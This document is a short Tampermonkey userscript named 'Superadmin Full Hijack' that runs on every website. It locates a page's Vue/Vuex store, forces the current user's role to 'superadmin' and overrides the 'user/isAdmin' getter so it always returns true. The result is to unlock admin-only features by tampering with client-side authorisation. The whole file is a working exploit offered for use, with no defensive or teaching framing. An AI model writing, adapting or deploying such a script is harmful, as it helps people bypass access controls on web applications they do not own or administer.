// ==UserScript==
// @name         Superadmin Full Hijack
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Force set role to superadmin and hijack isAdmin getter permanently on page load
// @author       Hitty
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    function hijackStore() {
        let appElement = document.querySelector('#app') || document.querySelector('body');
        if (!appElement) {
            console.error('[Exploit] App element not found.');
            return;
        }

        let vueInstance = null;
        for (let key in appElement) {
            if (key.startsWith('__vue__')) {
                vueInstance = appElement[key];
                break;
            }
        }

        if (!vueInstance) {
            console.error('[Exploit] Vue instance not found.');
            return;
        }

        let store = vueInstance.$store;
        if (!store) {
            console.error('[Exploit] Store not found.');
            return;
        }

        console.log('[Exploit] Store found, injecting...');

        // Step 1: Force superadmin role
        store.commit('user/setUser', {
            id: store.state.user.id,
            roleEnName: 'superadmin',
            homeUrl: store.state.user.homeUrl
        });

        console.log('[Exploit] Role changed to superadmin.');

        // Step 2: Bruteforce hijack the isAdmin getter
        Object.defineProperty(store.getters, 'user/isAdmin', {
            get: function () {
                return true;
            }
        });

        console.log('[Exploit] Getter user/isAdmin hijacked to always return true.');

        // Step 3 (optional): Log current role
        console.log('[Exploit] Current roleEnName:', store.state.user.roleEnName);
        console.log('[Exploit] Getter isAdmin:', store.getters['user/isAdmin']);
    }

    // Hook into DOM ready
    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        hijackStore();
    } else {
        window.addEventListener('DOMContentLoaded', hijackStore);
    }
})();
